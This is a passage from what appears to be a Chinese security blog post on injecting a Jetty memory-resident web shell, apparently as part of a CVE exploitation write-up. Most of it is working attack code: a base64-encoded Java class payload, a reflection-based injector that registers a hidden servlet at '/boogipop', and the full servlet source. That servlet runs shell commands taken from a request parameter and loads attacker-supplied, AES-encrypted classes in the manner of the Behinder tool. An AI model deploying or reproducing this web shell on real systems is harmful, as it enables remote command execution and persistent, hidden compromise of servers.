class="string">&quot;yv66vgAAADQBHgoARwB+CgAQAH8KAIAAgQoAWACCCQCDAIQIAIUKAIYAhwgAiAsAiQCKCACLCgAQAIwIAI0KABAAjgkAjwCQCACRBwCSCACTCACUCABhCACVBwCWCgCXAJgKAJcAmQoAmgCbCgAVAJwIAJ0KABUAngoAFQCfCwCgAKEKAKIAhwgAowsAiQCkCwCJAKUIAKYLAIkApwgAqAsAqQCqCACrCgCsAK0HAK4HAK8KACkAfgsAqQCwCgApALEIALIKACkAswoAKQC0CgAoALUKAKwAtgsAiQC3CgC4ALkKAEYAugoArAC7BwC8CgBBAL0KAD0AvgoANgC/CgA2AMAKAD0AwQgAwgcAwwcAxAcAxQoAPQDGBwDHCgDIAMkHAMoKAEMAywoARgDMBwDNBwDOAQABVQEADElubmVyQ2xhc3NlcwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAoTGNvbS9ib29naXBvcC9tZW1zaGVsbC9TZXJ2bGV0VGVtcGxhdGVzOwEADUJBU0U2NERlY29kZXIBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAEZGF0YQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEACmlucHV0Qnl0ZXMBAAJbQgEAB2VuY29kZXIHAM8BAAdEZWNvZGVyAQAaTGphdmEvdXRpbC9CYXNlNjQkRGVjb2RlcjsBAAxlbmNvZGVkQnl0ZXMBAAZkb1Bvc3QBAFIoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOylWAQAEY21kcwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAZyZXN1bHQBAANjbWQBAAFrAQAGY2lwaGVyAQAVTGphdmF4L2NyeXB0by9DaXBoZXI7AQAOZXZpbENsYXNzQnl0ZXMBAAlldmlsQ2xhc3MBABFMamF2YS9sYW5nL0NsYXNzOwEACmV2aWxPYmplY3QBABJMamF2YS9sYW5nL09iamVjdDsBAAx0YXJnZXRNZXRob2QBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQANU3RhY2tNYXBUYWJsZQcAkgcAXwcAygEACkV4Y2VwdGlvbnMHANABAAVkb0dldAEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAEYXJncwEAClNvdXJjZUZpbGUBABVTZXJ2bGV0VGVtcGxhdGVzLmphdmEMAEoASwwA0QDSBwDTDADUANUMANYA1wcA2AwA2QDaAQAeWytdIER5bmFtaWMgU2VydmxldCBzYXlzIGhlbGxvBwDbDADcAN0BAAR0eXBlBwDeDADfAOABAAViYXNpYwwAwgDhAQAEcGFzcwwA4gDjBwDkDADlAFQBAAEvAQAQamF2YS9sYW5nL1N0cmluZwEABy9iaW4vc2gBAAItYwEAAi9DAQARamF2YS91dGlsL1NjYW5uZXIHAOYMAOcA6AwA6QDqBwDrDADsAO0MAEoA7gEAAlxBDADvAPAMAPEA8gcA8wwA9AD1BwD2AQAQZTQ1ZTMyOWZlYjVkOTI1YgwA9wDgDAD4APIBAARQT1NUDAD5APoBAAF1BwD7DAD8AP0BAANBRVMHAP4MAP8BAAEAH2phdmF4L2NyeXB0by9zcGVjL1NlY3JldEtleVNwZWMBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwBAQECDAEDAQQBAAAMAQMBBQwBBgDyDABKAQcMAQgBCQwBCgELBwEMDAENAPIMAFEAUgwBDgDXAQAoY29tL2Jvb2dpcG9wL21lbXNoZWxsL1NlcnZsZXRUZW1wbGF0ZXMkVQwBDwEQDAERARIMAEoBEwwBFAEVDAEWARcBAAZlcXVhbHMBAA9qYXZhL2xhbmcvQ2xhc3MBABxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0AQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UMARgBGQEAEGphdmEvbGFuZy9PYmplY3QHARoMARsBHAEAE2phdmEvbGFuZy9FeGNlcHRpb24MAR0ASwwAXABdAQAmY29tL2Jvb2dpcG9wL21lbXNoZWxsL1NlcnZsZXRUZW1wbGF0ZXMBAB5qYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXQBABhqYXZhL3V0aWwvQmFzZTY0JERlY29kZXIBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAIZ2V0Qnl0ZXMBAAQoKVtCAQAQamF2YS91dGlsL0Jhc2U2NAEACmdldERlY29kZXIBABwoKUxqYXZhL3V0aWwvQmFzZTY0JERlY29kZXI7AQAGZGVjb2RlAQAGKFtCKVtCAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAHaXNFbXB0eQEAAygpWgEADGphdmEvaW8vRmlsZQEACXNlcGFyYXRvcgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAEbmV4dAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAlnZXRIZWFkZXIBAAlnZXRNZXRob2QBAApnZXRTZXNzaW9uAQAiKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgEADHNldEF0dHJpYnV0ZQEAJyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL09iamVjdDspVgEAE2phdmF4L2NyeXB0by9DaXBoZXIBAAtnZXRJbnN0YW5jZQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L2NyeXB0by9DaXBoZXI7AQAMZ2V0QXR0cmlidXRlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWAQAEaW5pdAEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQAJZ2V0UmVhZGVyAQAaKClMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAIcmVhZExpbmUBAAdkb0ZpbmFsAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAOZ2V0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQBCKExjb20vYm9vZ2lwb3AvbWVtc2hlbGwvU2VydmxldFRlbXBsYXRlcztMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAA9wcmludFN0YWNrVHJhY2UAIQBGAEcAAAAAAAUAAQBKAEsAAQBMAAAALwABAAEAAAAFKrcAAbEAAAACAE0AAAAGAAEAAAASAE4AAAAMAAEAAAAFAE8AUAAAAAoAUQBSAAEATAAAAGUAAgAEAAAAESq2AAJMuAADTSwrtgAETi2wAAAAAgBNAAAAEgAEAAAAFAAFABUACQAWAA8AFwBOAAAAKgAEAAAAEQBTAFQAAAAFAAwAVQBWAAEACQAIAFcAWgACAA8AAgBbAFYAAwAEAFwAXQACAEwAAAKIAAcACQAAAWCyAAUSBrYABysSCLkACQIAxgCKKxIIuQAJAgASCrYAC5kAeisSDLkACQIATi3GAGottgANmgBjAToEsgAOEg+2AAuZABoGvQAQWQMSEVNZBBISU1kFLVM6BKcAFwa9ABBZAxITU1kEEhRTWQUtUzoEuwAVWbgAFhkEtgAXtgAYtwAZEhq2ABu2ABw6BSy5AB0BABkFtgAepwDIKxIfuQAgAgDGAL0ruQAhAQASIrYAC5kApxIMTiu5ACMBABIkLbkAJQMAEia4ACc6BBkEBbsAKFm7AClZtwAqK7kAIwEAEiS5ACsCALYALBIttgAutgAvtgACEia3ADC2ADEZBCu5ADIBALYAM7gANLYANToFuwA2WSoqtgA3tgA4twA5GQW2ADo6BhkGtgA7OgcZBhI8Bb0APVkDEj5TWQQSP1O2AEA6CBkIGQcFvQBBWQMrU1kELFO2AEJXpwAITi22AESxAAEApQFXAVoAQwADAE0AAABmABkAAAAbAAgAHQAjAB8ALAAgADcAIQA6ACIARQAjAFwAJQBwACcAjAAoAJcAKgClAC0AswAuALYALwDEADAAywAxAPwAMgEPADMBJQA0ASwANQFDADYBVwA6AVoAOAFbADkBXwA8AE4AAACEAA0AOgBdAF4AXwAEAIwACwBgAFQABQAsAGsAYQBUAAMAtgChAGIAVAADAMsAjABjAGQABAEPAEgAZQBWAAUBJQAyAGYAZwAGASwAKwBoAGkABwFDABQAagBrAAgBWwAEAGwAbQADAAABYABPAFAAAAAAAWAAbgBvAAEAAAFgAHAAcQACAHIAAAAYAAf9AFwHAHMHAHQT+QAmAvsAvEIHAHUEAHYAAAAEAAEAdwAEAHgAXQACAEwAAABJAAMAAwAAAAcqKyy2AEWxAAAAAgBNAAAACgACAAAAQAAGAEEATgAAACAAAwAAAAcATwBQAAAAAAAHAG4AbwABAAAABwBwAHEAAgB2AAAABAABAHcACQB5AHoAAQBMAAAAKwAAAAEAAAABsQAAAAIATQAAAAYAAQAAAEsATgAAAAwAAQAAAAEAewBfAAAAAgB8AAAAAgB9AEkAAAASAAIANgBGAEgAAABYAIAAWQAJ&quot;</span>);</span><br><span class="line">            a.invoke(Thread.currentThread().getContextClassLoader(), b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] BASE64Decoder(String data)&#123;</span><br><span class="line">        <span class="type">byte</span>[] inputBytes = data.getBytes();</span><br><span class="line">        Base64.<span class="type">Decoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getDecoder();</span><br><span class="line">        <span class="type">byte</span>[] encodedBytes = encoder.decode(inputBytes);</span><br><span class="line">        <span class="keyword">return</span> encodedBytes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取上下文</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">GetWebContent</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">Thread</span> <span class="variable">currentThread</span> <span class="operator">=</span> Thread.currentThread();</span><br><span class="line">            <span class="type">Object</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> GetField(currentThread, <span class="string">&quot;contextClassLoader&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">_context</span> <span class="operator">=</span> GetField(contextClassLoader,<span class="string">&quot;_context&quot;</span>);</span><br><span class="line">            servletHandler = GetField(_context,<span class="string">&quot;_servletHandler&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">InjectServlet</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span>(servletHandler != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">//方法二</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">EvilServlet</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(filterClassName);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">addFilterWithMapping</span> <span class="operator">=</span> GetMethod(servletHandler, <span class="string">&quot;addServletWithMapping&quot;</span>, Class.class, String.class);</span><br><span class="line">            addFilterWithMapping.invoke(servletHandler, EvilServlet, <span class="string">&quot;/boogipop&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Object <span class="title function_">GetField</span><span class="params">(Object o, String k)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Field f;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f = o.getClass().getDeclaredField(k);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                f = o.getClass().getSuperclass().getDeclaredField(k);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e1)&#123;</span><br><span class="line">                f = o.getClass().getSuperclass().getSuperclass().getDeclaredField(k);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> f.get(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Method <span class="title function_">GetMethod</span><span class="params">(Object obj, String methodName, Class&lt;?&gt;... paramClazz)</span> <span class="keyword">throws</span> NoSuchMethodException &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(clazz != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                method = clazz.getDeclaredMethod(methodName, paramClazz);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var6) &#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (method == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchMethodException</span>(methodName);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> method;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InjectJettyServletShell</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            LoadServlet();</span><br><span class="line">            GetWebContent();</span><br><span class="line">            InjectServlet();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InjectJettyServletShell</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>其中ServerletTemplates的内容如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.boogipop.memshell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletTemplates</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] BASE64Decoder(String data)&#123;</span><br><span class="line">        <span class="type">byte</span>[] inputBytes = data.getBytes();</span><br><span class="line">        Base64.<span class="type">Decoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getDecoder();</span><br><span class="line">        <span class="type">byte</span>[] encodedBytes = encoder.decode(inputBytes);</span><br><span class="line">        <span class="keyword">return</span> encodedBytes;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Dynamic Servlet says hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(request.getParameter(<span class="string">&quot;type&quot;</span>) != <span class="literal">null</span> &amp;&amp; request.getParameter(<span class="string">&quot;type&quot;</span>).equals(<span class="string">&quot;basic&quot;</span>))&#123;</span><br><span class="line">            <span class="comment">//basic cmd shell</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;pass&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(cmd != <span class="literal">null</span> &amp;&amp; !cmd.isEmpty())&#123;</span><br><span class="line">                String[] cmds = <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">if</span>(File.separator.equals(<span class="string">&quot;/&quot;</span>))&#123;</span><br><span class="line">                    cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125;;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/C&quot;</span>, cmd&#125;;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next();</span><br><span class="line">                response.getWriter().println(result);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(request.getHeader(<span class="string">&quot;e45e329feb5d925b&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">//behind3 shell</span></span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (request.getMethod().equals(<span class="string">&quot;POST&quot;</span>))&#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">k</span> <span class="operator">=</span> <span class="string">&quot;pass&quot;</span>;</span><br><span class="line">                    request.getSession().setAttribute(<span class="string">&quot;u&quot;</span>,k);</span><br><span class="line">                    <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">                    cipher.init(<span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>((request.getSession().getAttribute(<span class="string">&quot;u&quot;</span>) + <span class="string">&quot;&quot;</span>).getBytes(), <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">                    <span class="type">byte</span>[] evilClassBytes = cipher.doFinal(BASE64Decoder(request.getReader().readLine()));</span><br><span class="line">                    <span class="type">Class</span> <span class="variable">evilClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">U</span>(<span class="built_in">this</span>.getClass().getClassLoader()).g(evilClassBytes);</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">evilObject</span> <span class="operator">=</span> evilClass.newInstance();</span><br><span class="line">                    <span class="type">Method</span> <span class="variable">targetMethod</span> <span class="operator">=</span> evilClass.getDeclaredMethod(<span class="string">&quot;equals&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;ServletRequest.class, ServletResponse.class&#125;);</span><br><span class="line">                    targetMethod.invoke(evilObject, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;request, response&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">U</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span>&#123;</span><br><span class="line">        U(ClassLoader c)&#123;<span class="built_in">super</span>(c);&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Class <span class="title function_">g</span><span class="params">(<span class="type">byte</span> []b)</span>&#123;<span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b,<span class="number">0</span>,b.length);&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个在我之前的文章中是有说明的。<br><a href="https://boogipop.com/2023/10/01/%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97%20Jetty%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/">内存马系列 Jetty型内存马学习 - Boogiepop Doesn’t Laugh</a><br>最后的效果如下。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1697457522619-19fe047e-d6a5-48b8-97d6-3d63c012070c.png#averageHue=%23f8f8f8&clientId=ud2243dba-4afd-4&from=paste&height=836&id=uffbb69db&originHeight=1045&originWidth=2423&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=54604&status=done&style=none&taskId=ubdf13b59-4eef-4685-9533-a8046ec3aa2&title=&width=1938.4" alt="image.png"><br>假如想要哥斯拉连接的话自行加上哥斯拉或者是冰蝎的逻辑即可。笔者在这里就不做处理了（懒狗一条），好了说到这里我就先把电脑关机一下，因为这个东西是真的吃运行内存啊，我就挂了一上午现在电脑已经要炸了感觉。。。。</p>
<h1 id="一些毛病"><a href="#一些毛病" class="headerlink" title="一些毛病"></a>一些毛病</h1><p>本地打是没什么问题的，但是换到我vps上后会出现这个问题。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1697458834732-c52f2a4b-8df9-45c7-834e-d5a111464eb4.png#averageHue=%2334383f&clientId=ue2a0c32f-ced2-4&from=paste&height=257&id=u7aa295c8&originHeight=321&originWidth=1623&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=405125&status=done&style=none&taskId=ubc276578-31f6-48eb-88ed-3c399f97030&title=&width=1298.4" alt="image.png"><br>会飘红connection reset，我不知道是不是我校园网的问题，但是我用流量的话就访问不到这个路由。测了傻逼校园网。</p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/Java/" class="tag">#Java</a><a href="/tags/CVE/" class="tag">#CVE</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/10/16/Atlassian%20Confluence%20CVE-2023-22515%20%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">Atlassian Confluence CVE-2023-22515 深入浅出</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/10/01/CVE-2023-38646%20Metabase%E6%9C%AA%E6%8E%88%E6%9D%83JDBC%20RCE/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">CVE-2023-38646 Metabase未授权JDBC RCE</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
